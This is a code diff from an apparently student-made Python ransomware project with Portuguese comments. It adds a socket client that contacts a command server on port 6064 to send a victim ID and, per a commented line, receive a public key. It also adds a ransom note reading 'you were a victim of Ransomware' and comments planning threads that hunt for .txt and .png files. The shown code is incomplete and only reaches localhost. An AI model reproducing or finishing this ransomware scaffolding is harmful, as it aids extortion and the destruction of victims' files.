@@ -7,6 +7,8 @@
 import os
 import crypt
 
+import socket, random
+
 '''
 
     COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
@@ -18,6 +20,14 @@ import crypt
 
 '''
 
+# UMA THREAD PROCURA POR .TXT
+# OUTRA THREAD PROCURA POR .PNG ... ETC
+
+
+
+texto='''
+    Bom dia, você foi vitma do Ransomware.
+'''
 
 def menu():
     home=os.environ['HOME']
@@ -110,9 +120,23 @@ def listar(diretorio):
                 arquivos.append(a)
     return arquivos
 
+def client(IP_serv):
 
+    porta=6064
+    try:
+        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket_obj.connect((IP_serv, porta))
+    except socket.error as erro:
+        print('Erro ocorrido: '+str(erro))
+        return
+    # conectado ao servidor
+    print('enviando ID')
+    mensagem='TESTE_ID'
+    socket_obj.send(mensagem)
+    #data = socket_obj.recv(1024) # recebeu do servidor a chave publica
 
 
 if __name__=="__main__":
-    print('começando')
-    menu()
+    print('tentando conectar ao server .... ')
+    #menu()
+    client('127.0.0.1')
